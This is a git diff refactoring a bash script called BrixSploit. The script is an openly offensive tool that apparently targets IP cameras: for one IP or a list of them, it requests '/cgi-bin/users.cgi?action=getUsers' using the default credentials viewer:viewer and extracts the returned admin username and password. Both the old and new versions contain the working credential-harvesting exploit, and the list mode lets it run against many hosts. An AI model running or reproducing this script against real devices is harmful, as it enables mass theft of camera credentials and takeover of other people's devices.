@@ -1,4 +1,5 @@
-#! /bin/bash
+#!/bin/bash
+set -e
 
 echo "______      _                _       _ _   "
 echo "| ___ \    (_)              | |     (_) |  "
@@ -8,40 +9,79 @@ echo "| |_/ / |  | |>  <\__ \ |_) | | (_) | | |_ "
 echo "\____/|_|  |_/_/\_\___/ .__/|_|\___/|_|\__|"
 echo "                      | |                  "
 echo "                      |_|                  "
-printf "\nMade by EMLGaming & M00SE\n"
+echo ""
+echo "Made by EMLGaming & M00SE"
+
+function print-help {
+    echo "Usage: $0 [Options]"
+    echo ""
+    echo "Options:"
+    echo "  -h, --help                   Prints this help page."
+    echo ""
+    echo "  -o=<file>, --output=<file>   Saves results in a file. Disables interactive mode."
+    echo "  -r=<file>, --read=<file>     Reads ip addresses from a file."
+    echo ""
+    echo "Examples:"
+    echo "$0 -r=iplist.txt -o=results.txt"
+}
+
+function check-ip {
+    set +e # prevent exiting on failed exploit
+    curl -s --max-time 10 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)'
+    set -e
+}
 
 
-if [ "$1" == "-h" ]; then
-  echo "Usage: ./BrixSploit.sh [arguments] "
-  printf " \nArguments:\n-o for output to file (example ./BrixSploit.sh -o test.txt\n-r for read ip adresses from list (example ./BrixSploit.sh -r ips.txt -o output.txt\n"
-  exit 0
+INTERACTIVE=1
+
+for i in "$@"
+do
+    case $i in
+        -h|--help)
+            print-help
+            exit 0 # prevent non-zero code
+        ;;
+
+        -o=*|--output=*)
+            OUTPUT="${i#*=}"
+        ;;
+
+        -r=*|--read=*)
+            INTERACTIVE=0
+            READ_FILE="${i#*=}"
+        ;;
+
+        *)
+            echo "Ignoring parameter ${i}: Unknown parameter"
+        ;;
+    esac
+done
+
+
+if [ $INTERACTIVE -eq "1" ]; then
+    # Interactive mode
+    echo "Enter target ip (e.g. 1.2.3.4:81):"
+    read ip
+    if [ -z ${OUTPUT+x} ]
+    then
+        check-ip $ip
+    else
+        check-ip $ip >> "$OUTPUT" 2>&1
+        echo "Output saved in ${OUTPUT}."
+    fi
+else
+    # Read mode
+    while read ip; do
+        if [ -z ${OUTPUT+x} ]
+        then
+            echo "${ip}:"
+            check-ip $ip
+            echo ""
+        else
+            echo "${ip}:" >> "$OUTPUT" 2>&1
+            check-ip $ip >> "$OUTPUT" 2>&1
+            echo "" >> "$OUTPUT" 2>&1
+        fi
+    done <$READ_FILE
+    echo "Output saved in ${OUTPUT}."
 fi
-
-if [ "$1" == "-o" ]; then
-  printf "\nIPadress and port of camera: (ip:port) \n"
-  read ip
-
-  printf $ip"\n" > $2 2>&1
-  curl -s --max-time 10 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' >> $2 2>&1
-  printf "\nDONE! Saved to $4!\n"
-  exit 0
-fi
-
-if [ "$1" == "-r" ]; then
-  let x=0
-  lines="$(wc -l $2 | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
-  while IFS='' read -r ip || [[ -n "$ip" ]]; do
-    let x+=1
-    echo "Working on IP $ip ($x/$lines)"
-    printf $ip"\n" >> $4 2>&1
-
-    curl -s --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' >> $4 2>&1
-    printf "\n" >> $4 2>&1
-  done < "$2"
-  printf "\nDONE! Saved to $4!\n"
-  exit 0
-fi
-
-printf "\nType -h for more options \n\nIPadress and port of camera: (ip:port) \n"
-read ip
-curl -s --max-time 10 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)'
